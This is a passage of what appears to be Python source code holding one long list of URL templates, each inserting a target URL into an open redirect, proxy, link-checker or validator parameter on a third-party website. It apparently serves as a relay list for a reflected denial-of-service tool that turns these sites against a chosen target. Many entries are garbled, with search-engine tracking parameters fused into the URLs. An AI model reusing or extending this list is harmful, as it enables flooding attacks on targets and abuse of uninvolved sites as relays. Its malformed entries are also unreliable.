			"http://www.backpacker.no/go.php?url=%s"%(url),
			"http://validator.w3.org/checklink?uri=%s"%(url),
			"http://tzf.free.fr/redirect.php?page=%s"%(url),
			"http://www.anglobelge.com/EN/splash-page/redirect.php?page=%s"%(url),
			"http://www.totalwars.ru/go.php?url=%s"%(url),
			"http://www.netintellgames.com/redirect.php?page=%s"%(url),
			"http://rawlab.mindcreations.com/redirect.php?page=%s"%(url),
			"http://www.pcpros-tx.com/php/redirect.php?page=%s"%(url),
			"http://www.taosadultbasketballleague.com/redirect.php?page=%s"%(url),
			"http://www.hxtrack.com/redirect.php?page=%s"%(url),
			"http://www.pia.org/IRC/qs/redirect.php?page=%s"%(url),
			"http://taosadultbasketball.com/redirect.php?page=%s"%(url),
			"http://www.aspnuke.it/gotoURL.asp?url=%s"%(url),
			"http://mcpe.tw/go.php?url=%s"%(url),
			"https://www.google.pl/interstitial?url=%s"%(url),
			"http://resuite.upg.it/gotoURL.asp?url=%s"%(url),
			"http://www.w3.org/RDF/Validator/ARPServlet?URI=%s"%(url),
			"http://www.psycommunity.it/gotoURL.asp?url=%s"%(url),
			"http://check-host.net/check-http?host=%s"%(url),
			"https://www.cheapassgamer.com/redirect.php?url=%s"%(url),
			"http://www.wordreference.com/es/translation.asp?tranword=returnreturn=%s"%(url),
			"http://ssomgmt.ascd.org/profile/createsso/CreateSSO.aspx?returnurl=httreturnUrl=%s"%(url),
			"http://host-tracker.com/check_page/?furl=%s"%(url),
			"http://www.answers.com/Q/What_does_la_pagina_meanpagina=%s"%(url),
			"http://apidock.com/rails/ActionController/Base/url_forurl=%s"%(url),
			"http://daimi.au.dk/CPnets/proxy.php?url=%s"%(url),
			"http://www.arakhne.org/redirect.php?url=%s"%(url),
			"http://www.ianfernando.com/if/index.php?url=%s"%(url),
			"http://worldwide.promega.com/country.aspx?returnUrlreturnUrl=%s"%(url),
			"http://www.legacy-game.net/redirect.php?url=%s"%(url),
			"http://www.daimi.au.dk/CPnets/proxy.php?url=%s"%(url),
			"http://go.20script.ir/index.php?url=%s"%(url),
			"http://www.24livenewspaper.com/site/index.php?url=%s"%(url),
			"http://thuonghieunguoiviet.com.vn/index.php?url=%s"%(url),
			"http://www.orangesoftware.nl/mailing/proxy.php?url=%s"%(url),
			"http://www.webeyn.com/git.php?url=%s"%(url),
			"http://www.haberoku.com/iframe.php?url=%s"%(url),
			"http://www.cheapfareguru.com/redirect.php?url=%s"%(url),
			"http://water.weather.gov/ahps2/nwsexit.php?url=%s"%(url),
			"http://www.exn.ro/redirect.php?url=%s"%(url),
			"http://www.egraphic.ru/report.php?url=%s"%(url),
			"https://ecolet.ro/zdesk/pnp/proxy.php?url=%s"%(url),
			"http://www.usacycling.org/coaches/CoachWaiver.php?url=%s"%(url),
			"http://www.scwa.ca.gov/lower.php?url=%s"%(url),
			"https://www.newzealandgirls.co.nz/all/proxy.php?url=%s"%(url),
			"http://www.smartelectronix.com/refer.php?url=%s"%(url),
			"http://www.yiiframework.com/forum/index.php/topic/15090-returnurl-is-indexphp/returnUrl=%s"%(url),
			"http://www.selectsmart.com/plus/select.php?url=%s"%(url),
			"http://www.filezaap.com/redir.php?url=%s"%(url),
			"http://www.php.net/source.php?url=%s"%(url),
			"http://www.dedbit.com/redir.php?url=%s"%(url),
			"http://www.hitutor.com.tw/login-s.php?url=%s"%(url),
			"http://www.logect.com/l.php?url=%s"%(url),
			"http://health.cat/open.php?url=%s"%(url),
			"http://www.babalweb.net/ar/open.php?url=%s"%(url),
			"http://www.presse-algerie.net/open.php?url=%s"%(url),
			"http://ezinemark.com/goto.php?url=%s"%(url),
			"http://www.brimat.com/cat/product/redir.php?url=%s"%(url),
			"http://www.animelatino.org/tracker/redir.php?url=%s"%(url),
			"https://blog.eduzones.com/redirect.php?url=%s"%(url),
			"http://jump.2ch.net/?img.theqoo.net/proxy.php?url=%s"%(url),
			"http://www.aruba.com/?redirect=%s"%(url),
			"http://site.vagas.com.br/oi?url=%s"%(url),
			"http://www.pbcorporate.com.sg/redir.php?url=%s"%(url),
			"http://ec.europa.eu/transparencyregister/public/homePage.do?redir=%s"%(url),
			"http://www.arabportal.net/redirect.php?url=%s"%(url),
			"http://www.perlmonks.org/?node=gotogoto=%s"%(url),
			"http://3sh.jp/wp-content/themes/forAndroid/redirect.php?url=%s"%(url),
			"http://hamann-russia.ru/open.php?url=%s"%(url),
			"http://www.laminex.com.au/?goto=%s"%(url),
			"http://baraja.cz/open.php?url=%s"%(url),
			"http://starabe.com/times2/open.php?url=%s"%(url),
			"http://factory.rayongz.com/redirect.php?url=%s"%(url),
			"http://bioremede.com/open.php?url=%s"%(url),
			"http://www.inbox.com/login.aspx?redir=%s"%(url),
			"http://www.whatspk.com/wallpapers/all/open.php?url=%s"%(url),
			"http://help.storylogue.com/open.php?url=%s"%(url),
			"https://www2.bancobrasil.com.br/aapf/login.jsp?url=%s"%(url),
			"http://163.13.175.7/dis/open.php?url=%s"%(url),
			"http://meka-bogensport.de/open.php?url=%s"%(url),
			"http://facenama.com/go.php?url=%s"%(url),
			"http://www.buyuknet.com/url.php?url=%s"%(url),
			"http://www.airparts.us/catalog/url.php?url=%s"%(url),
			"http://www.juncao.com.br/url.php?url=%s"%(url),
			"http://www.getjetso.com/forum/url.php?url=%s"%(url),
			"http://vidmo.org/auth.php?id=8&amp;lang=en&amp;ses_redirect_uri=%s"%(url),
			"http://jump.2ch.net/?yellow.ribbon.to/~mirror/url.php?url=%s"%(url),
			"http://www.francetoner.fr/identification.php?redir=%s"%(url),
			"http://www.sciencedz.net/open.php?url=%s"%(url),
			"http://www.rmdhw.com/url.php?url=%s"%(url),
			"http://www.animacje.krzysiek.biz/?url=%s"%(url),
			"http://www.photos.newocx.com/index.php?url=/book_proxy.phpproxy.php?url=%s"%(url),
			"http://www.fawag.pl/index.php?goto=%s"%(url),
			"http://www.sladur.com/login.php?redir=%s"%(url),
			"http://www.drewniana.malopolska.pl/?page=%s"%(url),
			"http://www.e-kiosk.pl/redir.php?t=newsweek&amp;prc=newsweekredir=%s"%(url),
			"http://ko.poznan.pl/?page=%s"%(url),
			"http://zuribikes.com/?uri=%s"%(url),
			"http://wersam.npage.de/request_unblock.php?uri=%s"%(url),
			"http://www.0595rc.com/user/url.php?url=%s"%(url),
			"http://sso.amorepacific.com/sso/sessioncheck.jsp?returnUrl=%s"%(url),
			"http://validator.w3.org/nu/?doc=%s"%(url),
			"http://mytopfiles.com/search.php?ss='''tube/buy.php?category=bol-chat.de/proxy.php?urlproxy.php?url=%s"%(url),
			"http://www.src-srpg.jpn.org/srcweb/rulechecker/rulecheck.cgi?url=%s"%(url),
			"http://www.econeteditora.com.br/?url=%s"%(url),
			"http://www.stmg.nl/index.php?id=%s"%(url),
			"http://www.skepticalscience.com/redirect.php?u=%s"%(url),
			"http://im.ufrj.br/~maurizio.monge/kanjax/proxy.php?url=%s"%(url),
			"http://www.stmg.nl/index.php?id=323index.php?ID=%s"%(url),
			"https://mytopfiles.com/search.php?ss='''tube/buy.php?category=google.com/proxy.php?urlproxy.php?url=%s"%(url),
			"https://seguro.cesgranrio.org.br/login.aspx?returnurl=%s"%(url),
			"http://realroi.ru/req/util/proxy.php?url=%s"%(url),
			"http://validator.w3.org/check?uri=%s"%(url),
			"http://www.montessorischoolvenlo.nl/index.php?page=/main.php?id=38309index.php?ID=%s"%(url),
			"http://www.montessorischoolvenlo.nl/index.php?page=/main.php?id=38309/index.php?id=%s"%(url),
			"http://www.nobelprize.org/mediaplayer/index.php?id=429index.php?ID=%s"%(url),
			"http://mytopfiles.com/search.php?ss='''tube/buy.php?category=validator.w3.org/checklink?uri=%s"%(url),
			"http://www.dekinderwerkplaats.nl/index.php?url=%s"%(url),
			"http://vkrugudruzei.ru/x/outlink?url=http://feedvalidator.org/check.cgi?url=%s"%(url),
			"http://www.xmarks.com/site/similar/2/jigsaw.w3.org/css-validator/validator-uri.html?created=allvalidator?uri=%s"%(url),
			"http://www.wizards.com/leaving.asp?url=http://jigsaw.w3.org/css-validator/validator?uri=%s"%(url),
			"http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=%s"%(url),
			"http://film-addiction.net/proxy.php?url=%s"%(url),
			"http://domaindig.org/%s"%(url),
			"http://g-pz.com/gallery/gallery.php?id=%s"%(url),
			"http://www.feedvalidator.org/check.cgi?url=%s"%(url),
			"http://feedvalidator.org/check.cgi?url=%s"%(url),
			"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=%s"%(url),
			"http://apidock.com/rails/ActionController/Base/redirect_toredirect=%s"%(url),
			"http://www.beta.onlinefootballmanager.com/forward.php?url=http:/www.onlinefussballmanager.de/forward.php?url=%s"%(url),
			"http://www.doe.mass.edu/cms/sites/all/modules/ckeditor_link/proxy.php?url=%s"%(url),
			"http://dero.dict.cc/?s=paginapagina=%s"%(url),
			"http://www.evallor.com/redirection.php?url=%s"%(url),
			"http://www.barrypopik.com/index.php?URL=http://futuresgroup.wordpress.com/greatreset/index.php?url=%s"%(url),
			"http://www.unmaskparasites.com/web-page-options/?url=http://chat4.fidion.de/redirect.php?url=%s"%(url),
			"http://doctypehtml.de/viewsource/index.php?url=http://doctypehtml.de/viewsource/index.php?url=%s"%(url),
			"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http://www.w3.org/2002/08/extract-semantic.xsl&xmlfile=%s"%(url),
			"https://www.wizards.com/leaving.asp?url=http://jigsaw.w3.org/css-validator/validator?uri=%s"%(url),
			"http://linkturk.com/link/index.php?url=%s"%(url),
			"http://jump.2ch.net/?www.brandnewdays.net/ruby/checker/check.cgi?url=%s"%(url),
			"http://www.akwaibomnewsonline.com/news/index.php?url=%s"%(url),
			"http://www.zive.cz/poradna/php-url/sc-20-cq-223771/?consultanswers=1&amp;sa=U&amp;ved=0CBQQFjAAahUKEwi9zd_Y5ojJAhUBhSwKHb94DBk&amp;usg=AFQjCNETg5H_smxjc_xAnY10yxf220n0xAphp?url=%s"%(url),
			"http://www.zive.cz/poradna/php-url/sc-20-cq-223771/?consultanswers=1&amp;sa=U&amp;ved=0CBQQFjAAahUKEwjkiLqY6YjJAhVIfywKHSTQBZ0&amp;usg=AFQjCNETg5H_smxjc_xAnY10yxf220n0xAphp?url=%s"%(url),
			"http://www.sgcarmart.com/emailafriend/index.php?URL=http://www.sgcarmart.com/direction/index.phpindex.php?url=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?350103-Windows-Server-2012-PHP-URL-Rewrite-issues&amp;sa=U&amp;ved=0CFQQFjAOahUKEwjkiLqY6YjJAhVIfywKHSTQBZ0&amp;usg=AFQjCNGh2Y_MQ2uJIAti18SRnpcx9ZLB2Aphp?url=%s"%(url),
			"http://forums.smitegame.com/showthread.php?60316-Add-a-referer-doesn-t-work&amp;sa=U&amp;ved=0CK0CEBYwL2oVChMIpKnWsOGSyQIVywYsCh2G1wFY&amp;usg=AFQjCNGhp4F5xL2tXEuy9BYSTdGd5x-4Ewreferer=%s"%(url),
			"http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html&amp;sa=U&amp;ved=0COUBEBYwImoVChMItMDeo-CPyQIVSwwsCh3WbQVp&amp;usg=AFQjCNFPUU1o48JUAHOPAyEVuwn6PS6ntAredirect=%s"%(url),
			"http://www.st-francois-de-sales.fr/gallery/gallery.php?id=%s"%(url),
			"http://www.syrianobles.com/%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0CMUBEBYwHWoVChMIpKnWsOGSyQIVywYsCh2G1wFY&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://www.xmarks.com/site/www.190.sy%s"%(url),
			"http://ejje.weblio.jp/content/redirect&amp;sa=U&amp;ved=0CKYEEBYwWmoVChMItMDeo-CPyQIVSwwsCh3WbQVp&amp;usg=AFQjCNF5t3Qpptj_Lt6AzYIi_2s0Haeqawredirect=%s"%(url),
			"http://www.afriphoto.com/expositions_gallery.php?id=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0CI0CEBYwMGoVChMItre1tOGSyQIVhY8sCh1twAvz&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
			"http://homakov.blogspot.com/2014/01/evolution-of-open-redirect-vulnerability.html&amp;sa=U&amp;ved=0CMUBEBYwHWoVChMI7LurreGSyQIVSf4sCh3cCQlY&amp;usg=AFQjCNFPUU1o48JUAHOPAyEVuwn6PS6ntAredirect=%s"%(url),
			"http://dontknow.me/at/?http://www.fallout3nexus.com/downloads/file.php?id=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0CL4BEBYwHGoVChMIpKnWsOGSyQIVywYsCh2G1wFY&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://www.definitions.net/definition/paginapagina=%s"%(url),
			"http://www.pixheaven.net/galerie_us.php?id=%s"%(url),
			"http://www.digimindsoft.com/fr/cart.php?id=%s"%(url),
			"http://www.oceanaresidences.com/keybiscayne/wp-content/themes/oceana/floorplans/large/4-12thfloor/01S.php?url=http://www.oceanaresidences.com/keybiscayne/wp-content/themes/oceanas.php?url=%s"%(url),
			"http://old.mirf.ru/articles.php?id=%s"%(url),
			"http://galleries.destinymoody.com/65_heidi/index.php?id=%s"%(url),
			"http://www.ipv6-spider.com/en/host/www.runnet.sy%s"%(url),
			"http://www.movescount.com/?signin&amp;redirect_uri=%s"%(url),
			"http://www.henokiens.com/content.php?id=%s"%(url),
			"http://play.americangirl.com/play/books/advice/book.php?bookid=Hair&amp;sa=U&amp;ved=0ahUKEwj4v8yQ-KbJAhXIMyYKHcItAXwQFghCMAg&amp;usg=AFQjCNEP46RTqo509nXXJ1HUB7UnEmfL7wBook.php?bookID=%s"%(url),
			"http://speakerplans.com/index.php?id=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0CJsCEBYwLGoVChMIpKnWsOGSyQIVywYsCh2G1wFY&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://chenxuehu.com/wp-content/themes/begin/inc/go.php?url=%s"%(url),
			"http://wayne.cool/redirect.php?data=%s"%(url),
			"http://www.unmaskparasites.com/web-page-options/?url=http://linuxsecurity.com.br/redir.php?url=%s"%(url),
			"http://www.evilution.co.uk/index.php?id=%s"%(url),
			"http://www.tonostano.com/index.php?id=%s"%(url),
			"http://www.nobelprize.org/mediaplayer/index.php?id=%s"%(url),
			"http://www.livejournal.com/identity/login.bml?type=twitter%s"%(url),
			"http://www.milano.aci.it/index.php?id=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0CFwQFjANahUKEwiBp6Kp4ZLJAhXEjSwKHbcvCcU&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://whatspk.com/wallpapers/all/open.php?url=%s"%(url),
			"http://www.unmaskparasites.com/web-page-options/?url=http://linuxsecurity.com.br/redir.php?url%s"%(url),
			"http://www.iconspedia.com/search/TWITTER/twitter%s"%(url),
			"http://www.refreshthing.com/index.php?url=%s"%(url),
			"http://www.rcrevolution.net/portal/modules/tinyd0/index.php?id=%s"%(url),
			"http://www.hamann-russia.ru/open.php?url=%s"%(url),
			"http://www.polisport.com/motorbikes/produtos.php?ID=6586php?id=%s"%(url),
			"http://www.communicationforsocialchange.org/mazi-articles.php?id=%s"%(url),
			"http://mytopfiles.com/search.php?ss='''tube/buy.php?category=%s"%(url),
			"http://la-conjugaison.nouvelobs.com/du/verbe/stresser.php%s"%(url),
			"http://www.the-conjugation.com/french/verb/stresser.php%s"%(url),
			"http://www.iscintelligence.com/event.php?id=%s"%(url),
			"http://www.shellauction.net/auction_shell.php%s"%(url),
			"http://www.bdtheque.com/forum_bds.php?num=%s"%(url),
			"http://www.theoangelopoulos.gr/newsone.php?id=%s"%(url),
			"http://vidmo.org/auth.php?ses_redirect_uri=%s"%(url),
			"https://googleblog.blogspot.com/2015/11/introducing-new-google%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwjD-pqXopPKAhVY2WMKHcaXD_gQFgiGATAU&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://www.thefreshloaf.com/node/24332/hobart-n50%s"%(url),
			"http://www.vizzed.com/playonlinegames//index.php?search=Night Trap/play_old.php?id=%s"%(url),
			"http://content.dynamicmessenger.com/cornerstone/?0DjcXFrxPxxF1rAmlZQQabHNGyFLO7Hl0&http://www.thestar.com/news/gta/article/1264293--openfile-news-website-suspends-publishing-ahead-of-pretty-big-change&amp;sa=U&amp;ved=0ahUKEwiN5cijopPKAhUL4mMKHeKTBOsQFgjuATAn&amp;usg=AFQjCNFuhQarx5FnSDV91RBCR880xvz7Ywopenfile=%s"%(url),
			"http://lyricstranslate.com/en/pagina-bianca-blank-page.html&amp;sa=U&amp;ved=0ahUKEwiVisaqopPKAhUL42MKHVDtAJoQFgjeATAm&amp;usg=AFQjCNHqd6kN4oLwutWPS_Obsg-xm1646gpagina=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwi18_WSopPKAhVB32MKHbYjAP8QFgieATAZ&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://davidtopping.tumblr.com/post/42974328699/what-openfile-owes&amp;sa=U&amp;ved=0ahUKEwiN5cijopPKAhUL4mMKHeKTBOsQFgiJATAU&amp;usg=AFQjCNGMiWUgKF__KySslo5GIv3W0V1buwopenfile=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwjeur6Huv7JAhVX32MKHY63AW0QFghyMBE&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://www.dict.cc/englisch-deutsch/redirect.html&amp;sa=U&amp;ved=0ahUKEwjUlP6UopPKAhVBU2MKHWNUAFIQFgiJATAU&amp;usg=AFQjCNHRy7mLHC3bFblkdwFIvY0YEX7o4gredirect=%s"%(url),
			"http://developers-forum.mercadolibre.com/index.php?/tags/forums/redirect_uri/&amp;sa=U&amp;ved=0ahUKEwjT4vDIipjKAhUDUJAKHdSqAHAQFgh7MBI&amp;usg=AFQjCNGZ-EXWdp9XtcUSvSok9J_bznpJFAredirect_uri=%s"%(url),
			"http://www.coral-shop.com/news.php?id=%s"%(url),
			"http://apidock.com/rails/Rack/Request/referer&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgiWATAV&amp;usg=AFQjCNHajOMVw7RUaHBD3OTCNQcIHsJzdgreferer=%s"%(url),
			"http://ilmiotempolibero.altervista.org/prima-pagina-di-gazzetta-dello-sport-tuttosport-e-corriere-t2.html&amp;sa=U&amp;ved=0ahUKEwiVisaqopPKAhUL42MKHVDtAJoQFgjHATAi&amp;usg=AFQjCNHulImcToZub40YAmbMjYq5jPxCpwpagina=%s"%(url),
			"http://www.schemehostport.com/2011/11/referer-sic.html&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgjMAzBJ&amp;usg=AFQjCNHlr_aBvpeaHoCW_QEjOvh-8_jw2Qreferer=%s"%(url),
			"http://www.sitepoint.com/forums/showthread.php?215729-Request-ServerVariables(-quot-HTTP-REFERER-quot-)&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgjrAjA5&amp;usg=AFQjCNGCO7GLxjwxmy139RxBU_E7ChxGtAreferer=%s"%(url),
			"http://wnewspaper.com/el-salvador/13655/La Pagina&amp;sa=U&amp;ved=0ahUKEwiVisaqopPKAhUL42MKHVDtAJoQFgi2ATAf&amp;usg=AFQjCNH8q_w_mSiRUDznhFmlSNE8ORzilApagina=%s"%(url),
			"http://addons.silverstripe.org/add-ons/cyberduck/referer-tracker&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgjGAjAz&amp;usg=AFQjCNF3xlQvi_jXAoilaWv3vj88Zua5ewreferer=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwi18_WSopPKAhVB32MKHbYjAP8QFgh2MBI&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://webbugtrack.blogspot.com/2008/11/bug-421-ie-fails-to-pass-http-referer.html&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgiYAzBB&amp;usg=AFQjCNHqLa_174X3NuCdHqfZOk7kBP2HTQreferer=%s"%(url),
			"http://homakov.blogspot.com/2012/04/playing-with-referer-origin-disquscom.html&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgjoATAj&amp;usg=AFQjCNFAtAgQIrI4agJFzpFzTYOSMC8BbAreferer=%s"%(url),
			"http://www.webdeveloper.com/forum/showthread.php?110626-If-referer-is-xxx-then-do-this&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgiuBDBZ&amp;usg=AFQjCNHdSX4M3AX78dHIR1MjUxl01UzpJQreferer=%s"%(url),
			"http://www.apifishcare.com/news-detail.php?id=19&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFgifATAa&amp;usg=AFQjCNGjbrEcMV0SnwRiiB589qeeM2a0IAnews/detail.php?ID=%s"%(url),
			"http://www.kaspiy.az/news.php?id=%s"%(url),
			"http://forums.asp.net/t/886708.aspx?Is+there+a+way+to+remove+the+returnUrl+querystring+&amp;sa=U&amp;ved=0ahUKEwjVzNGbopPKAhUD-2MKHev4BPYQFgg1MAU&amp;usg=AFQjCNH-VJhpcjC8FToCFQi99gqesx4ulwreturnUrl=%s"%(url),
			"http://forums.smitegame.com/showthread.php?60316-Add-a-referer-doesn-t-work&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgiDAzA9&amp;usg=AFQjCNGhp4F5xL2tXEuy9BYSTdGd5x-4Ewreferer=%s"%(url),
			"http://dynamicsnavax.blogspot.com/2013/09/bug-parameter-pageurl-is-missing-or.html&amp;sa=U&amp;ved=0ahUKEwjI__nTipjKAhUDUZAKHXdwBi4QFgieAjAz&amp;usg=AFQjCNG40Hf9az1UdPbX5dNP54JJlhMqLApageurl=%s"%(url),
			"http://www.cideko.com/news.php?id=%s"%(url),
			"http://larc-en-ciel.com/news/detail.php?id=1184&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFghoMBA&amp;usg=AFQjCNEt6U8Tx3g9KQk4O62G2vyBaQMH_gnews/detail.php?ID=%s"%(url),
			"http://firstreception.gov.gr/news-detail.php?id=21&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFgjIBDBj&amp;usg=AFQjCNHDWxeCcICAv1Ewpkaea8I2ZiQDWAnews/detail.php?ID=%s"%(url),
			"http://www.rol.ro/dir/mass_media/ziare-si-reviste/cotidiane/pagina-5-a-ziarului-libertatea/visit/&amp;sa=U&amp;ved=0ahUKEwiVisaqopPKAhUL42MKHVDtAJoQFgjYATAl&amp;usg=AFQjCNGRtCA-sDRcdLFsdQN3bogdMzFW4Qpagina=%s"%(url),
			"http://labo.dtpwiki.jp/sbm/check.cgi?url=%s"%(url),
			"http://www.nasl.com/news.php?id=%s"%(url),
			"http://www.pat-lin.com/eng/read_news.php?id=%s"%(url),
			"http://www.thaibizmyanmar.com/en/news/detail.php?ID=%s"%(url),
			"http://forums.asp.net/t/886708.aspx?Is+there+a+way+to+remove+the+returnUrl+querystring+&amp;sa=U&amp;ved=0ahUKEwiQw8HYipjKAhVGD5AKHa7xCAIQFgg6MAY&amp;usg=AFQjCNH-VJhpcjC8FToCFQi99gqesx4ulwreturnUrl=%s"%(url),
			"http://www.interfm.co.jp/news/detail.php?id=1165&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFgiFAjAt&amp;usg=AFQjCNFsmDV6l-LM0mJfcKyknjuGNiKckQnews/detail.php?ID=%s"%(url),
			"http://omahkain.com/search/google+oauth2+redirect_uri+with+several+parameters+++Stack+Overflow/&amp;sa=U&amp;ved=0ahUKEwjT4vDIipjKAhUDUJAKHdSqAHAQFgiJBDBe&amp;usg=AFQjCNGSUfOIrwwvONA28-zLhh74MGyNrAredirect_uri=%s"%(url),
			"http://jewisheurope.org/detail.asp?ID=1193&amp;sa=U&amp;ved=0ahUKEwjljeXNkJvKAhUX_mMKHY_7CYoQFgiIBDBc&amp;usg=AFQjCNEjx7LISWa41-WwYyM1fuTniLF1Uwdetail.asp?id=%s"%(url),
			"http://www.bryncricketclub.co.uk/players/gallery/gallery.php?id=%s"%(url),
			"http://forums.asp.net/t/1960513.aspx?Http+Referer+Validation&amp;sa=U&amp;ved=0ahUKEwjhrtnQipjKAhVGCpAKHRI5ANwQFgj_AzBR&amp;usg=AFQjCNEhz4UaYUYJBZRoBMeaCbKc1d7ecAreferer=%s"%(url),
			"http://www.fmokinawa.co.jp/news/detail.php?id=545&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFgiwBDBf&amp;usg=AFQjCNEzFpJ3X_TwV5vhFV7-ZeRwxHSKhgnews/detail.php?ID=%s"%(url),
			"http://www.fmokinawa.co.jp/news/detail.php?id=545&amp;sa=U&amp;ved=0ahUKEwiluPiQkJvKAhVGzmMKHRR0ClQQFgi6BDBh&amp;usg=AFQjCNEzFpJ3X_TwV5vhFV7-ZeRwxHSKhgnews/detail.php?ID=%s"%(url),
			"http://smash-jpn.com/new/detail.asp?id=%s"%(url),
			"http://www.interfm.co.jp/news/detail.php?id=1165&amp;sa=U&amp;ved=0ahUKEwiluPiQkJvKAhVGzmMKHRR0ClQQFgiFAjAt&amp;usg=AFQjCNFsmDV6l-LM0mJfcKyknjuGNiKckQnews/detail.php?ID=%s"%(url),
			"http://www.apifishcare.com/news-detail.php?id=19&amp;sa=U&amp;ved=0ahUKEwiluPiQkJvKAhVGzmMKHRR0ClQQFgiZATAZ&amp;usg=AFQjCNGjbrEcMV0SnwRiiB589qeeM2a0IAnews/detail.php?ID=%s"%(url),
			"http://www.szephazak.hu/gallery/gallery.php?id=%s"%(url),
			"http://ehime-npo.org/gallery/gallery.php?id=%s"%(url),
			"http://www.hongkongscottish.com/news-detail.php?id=408&amp;sa=U&amp;ved=0ahUKEwigqvD_jpvKAhUFKB4KHdlXAFwQFgibAzBG&amp;usg=AFQjCNFriKgbfn2RX06PDv3bbMHerI1HCQnews/detail.php?ID=%s"%(url),
			"http://www.hongkongscottish.com/news-detail.php?id=408&amp;sa=U&amp;ved=0ahUKEwiluPiQkJvKAhVGzmMKHRR0ClQQFgihAzBH&amp;usg=AFQjCNFriKgbfn2RX06PDv3bbMHerI1HCQnews/detail.php?ID=%s"%(url),
			"https://refor.detran.rj.gov.br/ReforWeb/servlet/StartCISPage?PAGEURL=/cisnatural/NatLogon.html&xciParameters.natsession=ReforWeb&amp;sa=U&amp;ved=0ahUKEwjI__nTipjKAhUDUZAKHXdwBi4QFgjsATAq&amp;usg=AFQjCNHt8yLGEOIj3lBhcxA5y6hD2sB2Owpageurl=%s"%(url),
			"http://forums.asp.net/t/2045424.aspx?MVC5+using+Microsoft+Account+redirect_uri+is+not+valid+&amp;sa=U&amp;ved=0ahUKEwjT4vDIipjKAhUDUJAKHdSqAHAQFgh1MBE&amp;usg=AFQjCNFcceLBQqzdDFISHSwtdxTEDvnBhgredirect_uri=%s"%(url),
			"http://www.hokuren.or.jp/news/detail.php?id=341&amp;sa=U&amp;ved=0ahUKEwiluPiQkJvKAhVGzmMKHRR0ClQQFgizAzBK&amp;usg=AFQjCNEjZOUgi2-urHWyj9gvLHFsoAEHagnews/detail.php?ID=%s"%(url),
			"http://www.temeculainformation.com/classified/view_items.php?id=%s"%(url),
			"http://www.bsu.edu.ru/en/news/detail.php?ID=%s"%(url),
			"http://www.rererenore.jp/gallery/gallery.php?id=%s"%(url),
			"http://www.organelle.jp/gallery/gallery.php?id=%s"%(url),
			"http://starkom.eu/bazar/view_items.php?id=%s"%(url),
			"http://thesilvercutter.com/gallery/gallery.php?id=%s"%(url),
			"http://www.jk-n.com/gallery/gallery.php?id=%s"%(url),
			"http://rise-consultant.jp/gallery/gallery.php?id=%s"%(url),
			"http://www.ikejiri.biz/gallery/gallery.php?id=%s"%(url),
			"http://www.mitsuda.biz/gallery/gallery.php?id=%s"%(url),
			"http://rockabirity.co.jp/gallery/gallery.php?id=%s"%(url),
			"http://www.atalantacorp.com/products.php?type=%s"%(url),
			"http://www.aihiroko.com/gallery/gallery.php?id=%s"%(url),
			"http://www.tridenteng.co.uk/products.php?type=%s"%(url),
			"http://ayabe-eitai.net/gallery/gallery.php?id=%s"%(url),
			"http://cmpauction.thecmp.org/detail.asp?id=%s"%(url),
			"http://www.integrasys-sa.com/products.php?type=%s"%(url),
			"http://www.azgranitecreations.com/products.php?type=%s"%(url),
